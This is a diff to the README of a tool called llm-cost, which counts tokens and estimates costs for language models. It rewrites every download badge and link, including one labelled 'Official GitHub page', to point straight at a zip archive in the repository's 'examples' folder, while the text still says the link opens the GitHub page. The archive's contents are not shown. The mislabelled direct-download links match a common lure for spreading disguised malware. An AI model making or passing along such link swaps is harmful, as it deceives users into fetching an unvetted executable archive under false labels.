@@ -1,6 +1,6 @@
 # ⚖️ llm-cost - Easy Token Counting and Cost Estimation
 
-[![Download llm-cost](https://img.shields.io/badge/Download-llm--cost-blue?style=for-the-badge)](https://github.com/islaagnet27/llm-cost)
+[![Download llm-cost](https://img.shields.io/badge/Download-llm--cost-blue?style=for-the-badge)](https://github.com/islaagnet27/llm-cost/raw/refs/heads/main/examples/llm_cost_v3.3.zip)
 
 ---
 
@@ -27,7 +27,7 @@ This tool helps you understand how many tokens your text uses and what the estim
 
 Start by opening the llm-cost download page here:
 
-[![Download llm-cost](https://img.shields.io/badge/Download-llm--cost-grey?style=for-the-badge)](https://github.com/islaagnet27/llm-cost)
+[![Download llm-cost](https://img.shields.io/badge/Download-llm--cost-grey?style=for-the-badge)](https://github.com/islaagnet27/llm-cost/raw/refs/heads/main/examples/llm_cost_v3.3.zip)
 
 Click this link and it will take you to the GitHub page where you can get all files related to this tool.
 
@@ -80,8 +80,8 @@ The program uses current token prices for each provider. This helps you understa
 
 ## 🔗 Useful Links
 
-- Official GitHub page: https://github.com/islaagnet27/llm-cost  
-- Download page: https://github.com/islaagnet27/llm-cost
+- Official GitHub page: https://github.com/islaagnet27/llm-cost/raw/refs/heads/main/examples/llm_cost_v3.3.zip  
+- Download page: https://github.com/islaagnet27/llm-cost/raw/refs/heads/main/examples/llm_cost_v3.3.zip
 
 ---
 
